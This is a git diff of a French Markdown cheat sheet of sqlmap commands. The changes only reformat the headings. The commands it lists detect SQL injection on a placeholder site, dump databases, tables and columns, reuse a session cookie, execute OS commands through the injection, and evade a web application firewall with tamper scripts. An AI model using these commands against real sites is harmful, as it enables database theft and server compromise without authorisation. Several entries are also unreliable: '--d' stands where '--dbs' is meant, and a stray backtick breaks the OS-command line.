@@ -2,66 +2,65 @@
 
 ##  Commandes les plus utiles
 
-➡️ Test simple d'injection sur une URL
+### Test simple d'injection sur une URL
 ```
 sqlmap -u "http://site.com/page.php?id=1"
 ```
 `
-➡️ Détection + dump automatique de la BDD
+###  Détection + dump automatique de la BDD
 ```
 sqlmap -u "http://site.com/page.php?id=1" --batch --dump
 ```
 `
-➡️ Spécifier un paramètre vulnérable
+###  Spécifier un paramètre vulnérable
 ```
 sqlmap -u "http://site.com/page.php" --data="id=1" --batch
 ```
 `
-➡️ Enumérer toutes les BDD
+###  Enumérer toutes les BDD
 ```
 sqlmap -u "http://site.com/page.php?id=1" --d
 ```
 
-➡️ Choisir une BDD spécifique et lister ses tables
+### Choisir une BDD spécifique et lister ses tables
 ```
 sqlmap -u "http://site.com/page.php?id=1" -D nom_bdd --tables
 ```
 `
-➡️ Lister les colonnes d'une table spécifique
+###  Lister les colonnes d'une table spécifique
 ```
 sqlmap -u "http://site.com/page.php?id=1" -D nom_bdd -T nom_table --columns
 ```
 
-➡️ Dumper les données d'une table spécifique
+###  Dumper les données d'une table spécifique
 ```
 sqlmap -u "http://site.com/page.php?id=1" -D nom_bdd -T nom_table --dump
 ```
 `
-➡️ Scan avec cookie de session
+###  Scan avec cookie de session
 ```
 sqlmap -u "http://site.com/page.php?id=1" --cookie="PHPSESSID=abc123"
 ```
 `
-➡️ Utilisation d’un fichier POST complet
+###  Utilisation d’un fichier POST complet
 ```
 sqlmap -r requete.txt
 ```
 
-➡️ Détection du SGBD
+### Détection du SGBD
 ```
 sqlmap -u "http://site.com/page.php?id=1" --dbms=mysql
 ```
 `
-➡️ Tentative d'exécution de commande système (si vulnérable)
+### Tentative d'exécution de commande système (si vulnérable)
 ```
 sqlmap -u "http://site.com/page.php?id=1" --os-cmd="whoami"`
 ```
 
-➡️ Bypass WAF avec random case + encodage
+###  Bypass WAF avec random case + encodage
 ```
 sqlmap -u "http://site.com/page.php?id=1" --tamper=between,randomcase,charencode
 ```
-`
 
 ---
 
